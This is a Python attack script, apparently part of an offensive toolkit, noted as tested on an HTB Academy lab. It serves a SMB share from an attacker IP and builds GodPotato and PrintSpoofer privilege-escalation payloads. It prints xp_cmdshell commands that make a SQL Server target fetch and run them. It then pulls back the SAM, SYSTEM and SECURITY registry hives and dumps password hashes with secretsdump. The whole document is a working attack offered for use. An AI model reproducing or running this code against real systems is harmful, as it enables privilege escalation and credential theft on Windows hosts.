# This example can be used for SeImpersonatePrivileged services
# Tested on HTB Academy

from payload import SamDumpPowershell, GodPotato, PrintSpoofer, CRunPowershellExe
from tempsmbserver import TempSMB
from stolen_from_impacket.secretsdump import dump

local_ip = "10.10.16.101"
print_spoofer = True

with TempSMB(local_ip=local_ip) as smb:
    sam_dump_payload = SamDumpPowershell(smb)
    godpotato_payload = GodPotato(smb, input_files=[sam_dump_payload.file])
    printspoofer_payload = PrintSpoofer(smb, input_files=[sam_dump_payload.file])

    exe_runner_godpotato = CRunPowershellExe(smb, input_files=[godpotato_payload.file])
    exe_runner_printspoofer = CRunPowershellExe(smb, input_files=[printspoofer_payload.file])


    print(f"{"="*10}ANGRY SMB READY{"="*10}")
    print(f"{"="*10}GOD POTATO{"="*10}")
    print(exe_runner_godpotato.file.remote_path)
    print(f"xp_cmdshell {exe_runner_godpotato.file.remote_path}")

    print(f"{"="*10}PRINT SPOOFER{"="*10}")
    print(exe_runner_printspoofer.file.remote_path)
    print(f"xp_cmdshell {exe_runner_printspoofer.file.remote_path}")
    print(f"{"="*10}waiting{"="*10}")
    sam_dump_payload.await_output_files()
    print(f"{"="*10}secretsdump{"="*10}")
    try:
        dump(sam_dump_payload.sam.local_path, sam_dump_payload.system.local_path, sam_dump_payload.security.local_path)
    except Exception as e:
        print(e)
        print("Sleep timer for awaiting the dumped files might be too short")
